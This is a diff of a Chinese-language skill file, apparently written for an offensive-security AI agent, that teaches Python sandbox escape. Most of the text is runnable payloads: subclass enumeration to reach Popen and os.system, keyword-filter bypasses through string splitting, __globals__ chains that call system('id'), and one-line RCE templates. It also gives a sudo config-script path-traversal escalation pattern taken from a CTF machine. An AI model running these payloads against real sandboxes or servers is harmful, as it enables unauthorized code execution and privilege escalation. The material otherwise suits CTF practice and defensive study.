@@ -4,7 +4,7 @@ description: 'Python 沙箱逃逸通用模式：subclass枚举、关键字bypass
 disable-model-invocation: true
 metadata: { domain: web, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+
 
 # Python 沙箱逃逸通用模式
 
@@ -23,7 +23,7 @@ String-based 关键字过滤永远是脆弱的——运行时内存中 dangerous
 ().__class__.__mro__[-1].__subclasses__()
 # 或者：
 ().__class__.__base__.__subclasses__()
-```
+```text
 
 ## 2. 找到 subprocess.Popen（或 os.system）
 
@@ -36,7 +36,7 @@ for i, c in enumerate(().__class__.__mro__[-1].__subclasses__()):
 # 直接用索引（如果已知）
 Popen = ().__class__.__mro__[-1].__subclasses__()[317]
 Popen(['cmd', 'arg'])
-```
+```text
 
 ### 常用目标类索引（Python 3.x）
 | 类名 | 用途 | 典型索引 |
@@ -58,7 +58,7 @@ getattr((), getattr(getattr((), '__cla' + 'ss__'), '__mr' + 'o__'))[-1]
 
 # 拼接
 getattr((), '_' + '_class_' + '_')
-```
+```text
 
 ### 3.2 禁用了 import / os / subprocess / Popen
 ```python
@@ -71,14 +71,14 @@ for i, c in enumerate(().__class__.__mro__[-1].__subclasses__()):
     name = c.__name__
     if name[0] == 'P' and len(name) == 5:  # Popen
         target = c
-```
+```text
 
 ### 3.3 禁用了 `eval` / `exec` / `open`
 ```python
 # 不用 eval——直接调 Popen
 # 不用 open——用 subprocess(['cat', '/path/file'])
 # 不用 exec——用 types.FunctionType(code, {})
-```
+```text
 
 ## 4. 从 Popen 外的方法链
 
@@ -91,7 +91,7 @@ w.__init__.__globals__['__builtins__']['__import__']('os').system('id')
 # 通过 os._wrap_close
 os_wrap = ().__class__.__mro__[-1].__subclasses__()[135]
 os_wrap.__init__.__globals__['system']('id')
-```
+```text
 
 ## 5. 通用 RCE 模板（一句话）
 
@@ -104,16 +104,16 @@ os_wrap.__init__.__globals__['system']('id')
 
 # 模板 C: 通过 subprocess 模块
 ().__class__.__mro__[-1].__subclasses__()[84].__init__.__globals__['sys'].modules['subprocess'].Popen('CMD',shell=True)
-```
+```text
 
 ## 6. sudo + config-consumer 脚本 = 间接任意文件操作
 
 来自 Code 靶机的 `sudo /usr/bin/backy.sh /root/backy.conf`：
 
-```
+```yaml
 模式: sudo <script> <config_file>
 原理: config 中的路径字段（如 directories_to_archive）可能绕过验证
-```
+```text
 
 关键检查点：
 - `..` 路径穿越：`/root/..//root/` 绕过 strip('/root')
@@ -134,7 +134,7 @@ sudo -l
 # 3. 脚本是否 eval() / exec() / system() 用户输入？
 # 4. 脚本参数可控吗？
 # 5. 环境变量影响脚本行为吗？
-```
+```text
 
 ## 教训
 - **Blocklist 过滤永远不安全**——用 allowlist 或真 sandbox（RestrictedPython, gVisor, seccomp）
